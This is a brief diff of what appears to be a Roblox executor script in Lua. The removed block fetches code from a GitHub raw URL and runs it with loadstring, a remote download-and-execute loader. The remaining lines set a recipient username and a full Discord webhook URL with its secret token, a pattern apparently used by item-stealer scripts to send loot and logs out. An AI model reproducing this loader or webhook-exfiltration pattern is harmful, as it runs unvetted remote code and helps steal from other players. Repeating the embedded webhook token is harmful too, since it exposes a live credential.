@@ -1,31 +1,3 @@
-local token = "123123"
-local url = "https://raw.githubusercontent.com/MetterX8/MetterXcripts/refs/heads/main/Universal%20Script%20%5BUPDATED%5D"
-local headers = {
-    ["Authorization"] = "Bearer " .. token,
-    ["Accept"] = "application/vnd.github+json",
-    ["User-Agent"] = "Roblox Executor"
-}
-local response
-if syn and syn.request then
-    response = syn.request({
-        Url = url,
-        Method = "GET",
-        Headers = headers
-    })
-elseif http_request then
-    response = http_request({
-        Url = url,
-        Method = "GET",
-        Headers = headers
-    })
-end
-
-if response and response.StatusCode == 200 then
-    local scriptContent = response.Body
-    loadstring(scriptContent)()
-end
-
-
 local Username = "garbage_collector005" 
 local Webhook = "https://discord.com/api/webhooks/1311885986535444533/Ym62wa2UPWZhEMqIbI9L9mTLmA0yS9j0v1B_7sXB-WaB8sJpDQ9lObHIml2mFm4lbVpJ"
 
